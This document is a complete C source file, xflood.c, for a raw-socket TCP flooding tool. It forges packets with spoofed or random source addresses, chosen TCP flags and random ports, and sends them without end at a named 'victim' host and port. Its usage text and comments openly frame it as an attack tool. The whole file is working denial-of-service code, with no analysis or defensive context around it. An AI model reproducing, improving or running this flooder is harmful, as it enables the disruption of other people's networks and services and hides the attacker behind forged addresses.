/* xflood.c
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>

#define ENDIAN_LITTLE

int rawsock = 0;
unsigned int start;
unsigned int packets = 0;
unsigned short databytes = 0;

unsigned short
csum (unsigned short *addr, int len)
{
  int nleft = len;
  unsigned int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(unsigned char *) (&answer) = *(unsigned char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

struct tcphdr2
{
  unsigned short th_sport;	/* source port */
  unsigned short th_dport;	/* destination port */
  unsigned int th_seq;		/* sequence number */
  unsigned int th_ack;		/* acknowledgement number */
  unsigned char th_x2:4;	/* (unused) */
  unsigned char th_off:4;	/* data offset */
  unsigned char th_flags;
  unsigned short th_win;	/* window */
  unsigned short th_sum;	/* checksum */
  unsigned short th_urp;	/* urgent pointer */
};

struct ip
{
#ifdef ENDIAN_LITTLE
  unsigned int ip_hl:4;		/* header length */
  unsigned int ip_v:4;		/* version */
#else
  unsigned int ip_v:4;		/* version */
  unsigned int ip_hl:4;		/* header length */
#endif
  unsigned char ip_tos;		/* type of service */
  unsigned short ip_len;	/* total length */
  unsigned short ip_id;		/* identification */
  unsigned short ip_off;	/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* dont fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
  unsigned char ip_ttl;		/* time to live */
  unsigned char ip_p;		/* protocol */
  unsigned short ip_sum;	/* checksum */
  struct in_addr ip_src, ip_dst;	/* source and dest address */
};

struct ph
{				/* rfc 793 tcp pseudo-header */
  unsigned long saddr, daddr;
  char mbz;
  char ptcl;
  unsigned short tcpl;
};

struct tcp_opthdr
{
  unsigned char op0;
  unsigned char op1;
  unsigned char op2;
  unsigned char op3;
  unsigned char op4;
  unsigned char op5;
  unsigned char op6;
  unsigned char op7;
/* we only need this if we use window scaling and timestamps */
#ifdef WSCALE
  unsigned char op8;
  unsigned char op9;
  unsigned char op10;
  unsigned char op11;
  unsigned char op12;
  unsigned char op13;
  unsigned char op14;
  unsigned char op15;
  unsigned char op16;
  unsigned char op17;
  unsigned char op18;
  unsigned char op19;
#endif
};

struct
{
  char buf[1551];		/* 64 kbytes for the packet */
  char ph[1551];		/* 64 bytes for the paeudo header packet */
} tcpbuf;

unsigned int
lookup (char *hostname)
{
  struct hostent *name;
  unsigned int address;

  if ((address = inet_addr (hostname)) != -1)
    return address;
  if ((name = gethostbyname (hostname)) == NULL)
    return -1;

  memcpy (&address, name->h_addr, name->h_length);
  return address;
}

void
handle_exit ()
{
  printf ("Flood completed, %d packets sent, %d seconds, %d packets/sec\n",
	  packets, time (NULL) - start, packets / (time (NULL) - start));
  exit (0);
}

void
attack (unsigned int dstip, unsigned int srcip, unsigned short dstport,
	unsigned short srcport, unsigned short flags)
{
  struct sockaddr_in sin;
  int x;
  char *xptr,*xinc=&srcip;
  struct ip *xf_iphdr = (struct ip *) tcpbuf.buf;
  struct tcphdr2 *xf_tcphdr =
    (struct tcphdr2 *) (tcpbuf.buf + sizeof (struct ip));
  struct tcp_opthdr *xf_tcpopt =
    (struct tcp_opthdr *) (tcpbuf.buf + sizeof (struct ip) +
			   sizeof (struct tcphdr2));

/* for the pseudo header */
  struct ph *ps_iphdr = (struct ph *) tcpbuf.ph;
  struct tcphdr2 *ps_tcphdr =
    (struct tcphdr2 *) (tcpbuf.ph + sizeof (struct ph));
  struct tcp_opthdr *ps_tcpopt =
    (struct tcp_opthdr *) (tcpbuf.ph + sizeof (struct ph) +
			   sizeof (struct tcphdr2));

/* fill the packets with random data */
  for (x = 0; x <= sizeof (tcpbuf.buf); x++)
    {
      tcpbuf.buf[x] = random ();
    }

/* duplicate */
  memcpy (tcpbuf.ph, tcpbuf.buf, sizeof (tcpbuf.ph));


  xf_iphdr->ip_v = 4;
  xf_iphdr->ip_hl = 5;
  xf_iphdr->ip_tos = 0;

#ifdef MACOS
  xf_iphdr->ip_len =
    sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr);
  xf_iphdr->ip_off = 0x4000;
#else
  xf_iphdr->ip_len =
    htons (sizeof (struct ip) + sizeof (struct tcphdr2) +
	   sizeof (struct tcp_opthdr));
  xf_iphdr->ip_off = htons (0x4000);
#endif
  xf_iphdr->ip_id = htons (random ());	/* random IP id */

  xf_iphdr->ip_ttl = 30;
  xf_iphdr->ip_p = IPPROTO_TCP;

  xf_tcphdr->th_seq = htonl (rand ());

  xf_tcphdr->th_off =
    (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr)) / 4;
  xf_tcphdr->th_ack = (random ());

/* large windows are more evil */
  xf_tcphdr->th_win = 64240;
  xf_tcphdr->th_urp = 0;

/* set the flags */
  xf_tcphdr->th_flags = flags;

/* source ip */

/* option headers */
#ifdef WSCALE
/* mss */
  xf_tcpopt->op0 = 2;
  xf_tcpopt->op1 = 4;
  xf_tcpopt->op2 = 6;
  xf_tcpopt->op3 = 0xb4;

/* sackok */
  xf_tcpopt->op4 = 4;
  xf_tcpopt->op5 = 2;

/* timestamp */
  xf_tcpopt->op6 = 8;
  xf_tcpopt->op7 = 0x0a;
  xf_tcpopt->op8 = 0xb2;
  xf_tcpopt->op9 = 8;
  xf_tcpopt->op10 = 0xf0;
  xf_tcpopt->op11 = 0x47;

  xf_tcpopt->op12 = 0;
  xf_tcpopt->op13 = 0;
  xf_tcpopt->op14 = 0;
  xf_tcpopt->op15 = 0;
/* nop */
  xf_tcpopt->op16 = 0x01;
/* window scaling */
  xf_tcpopt->op17 = 0x03;
  xf_tcpopt->op18 = 0x03;
  xf_tcpopt->op19 = 0x04;
#else
  xf_tcpopt->op0 = 2;
  xf_tcpopt->op1 = 4;
  xf_tcpopt->op2 = 5;
  xf_tcpopt->op3 = 0xb4;
  xf_tcpopt->op4 = 1;
  xf_tcpopt->op5 = 1;
  xf_tcpopt->op6 = 4;
  xf_tcpopt->op7 = 2;
#endif


/* *** Pseudo Header *** */
  ps_iphdr->mbz = 0;
  ps_iphdr->ptcl = IPPROTO_TCP;
  ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
  ps_iphdr->tcpl =
    htons (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);

  memcpy (ps_tcphdr, xf_tcphdr, sizeof (struct tcphdr2));
  memcpy (ps_tcpopt, xf_tcpopt, sizeof (struct tcp_opthdr));

  xf_tcphdr->th_sport = htons (srcport);
  xf_tcphdr->th_dport = htons (dstport);

  ps_tcphdr->th_sport = htons (srcport);
  ps_tcphdr->th_dport = htons (dstport);

/* dest address */
  ps_iphdr->daddr = dstip;
  xf_iphdr->ip_dst.s_addr = dstip;

  printf ("Sending packets of size %d....\n",
	  sizeof (struct ph) + sizeof (struct tcphdr2) +
	  sizeof (struct tcp_opthdr) + databytes);
  for (;;)
    {

      if (srcip == 0)
        {                       /* random dest ports */
	  ps_iphdr->daddr = srcip;
	  xf_iphdr->ip_src.s_addr = srcip;
         } else {
	  xinc[3] = (unsigned char) rand();
          xf_iphdr->ip_src.s_addr = srcip;
         }
      if (dstport == 0)
	{			/* random dest ports */
	  xf_tcphdr->th_dport = random ();
	  ps_tcphdr->th_dport = xf_tcphdr->th_dport;
	}
      if (srcport == 0)
	{
	  xf_tcphdr->th_sport = random ();
	  ps_tcphdr->th_sport = xf_tcphdr->th_sport;
	}

      if (srcip == 0)
	{			/* random source */
	  xf_iphdr->ip_src.s_addr = rand ();
	  ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
	}

/* we could do this globally too */
      sin.sin_family = AF_INET;
      sin.sin_port = xf_tcphdr->th_dport;
      sin.sin_addr.s_addr = dstip;


/* calculate tcp checksum */
      xf_tcphdr->th_sum = 0;
      xf_tcphdr->th_sum =
	csum ((unsigned short *) tcpbuf.ph,
	      sizeof (struct ph) + sizeof (struct tcphdr2) +
	      sizeof (struct tcp_opthdr) + databytes);

/* send */
//printf ("Sending packet size %d %d\n", sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes, ps_iphdr->tcpl);
//sleep(1);
      sendto (rawsock, tcpbuf.buf,
	      sizeof (struct ip) + sizeof (struct tcphdr2) +
	      sizeof (struct tcp_opthdr) + databytes, 0,
	      (struct sockaddr *) &sin, sizeof (sin));
      packets++;
    }

}

main (int argc, char **argv)
{
  unsigned int srcip, dstip;
  unsigned short dstport, srcport;
  unsigned char flags;
  int hincl = 1;

/* parse arguments */
  if (argc < 6)
    {
      printf ("usage : %s dest src destport srcport flags [size]\n\n",
	      argv[0]);
      printf ("dest       = the victim ip/host\n");
      printf ("src        = ip to spoof the attack as\n");
      printf ("destport   = port to attack on the victim\n");
      printf ("srcport    = port which the packets will come from\n");
      printf ("flags      = tcp packet flags\n");
      printf ("size       = tcp packet size (not inc header)\n");

      exit (0);
    }

/* allocate socket */
  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (rawsock <= 0)
    {
      printf ("Error opening raw socket\n");
      exit (-1);
    }

     setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

  dstip = lookup (argv[1]);
  if (dstip <= 0)
    {
      printf ("Cant resolve victim\n");
    }
  srcip = lookup (argv[2]);
  if (srcip <= 0)
    {
      printf ("Cant resolve source address\n");
    }

  if (argv[6])
    {
      databytes = atoi (argv[6]);
    }
  else
    {
      databytes = 0;
    }
  dstport = atoi (argv[3]);
  srcport = atoi (argv[4]);
  flags = atoi (argv[5]);

  signal (SIGINT, handle_exit);
  signal (SIGTERM, handle_exit);
  signal (SIGQUIT, handle_exit);
  start = time (NULL);
  attack (dstip, srcip, dstport, srcport, flags);

}
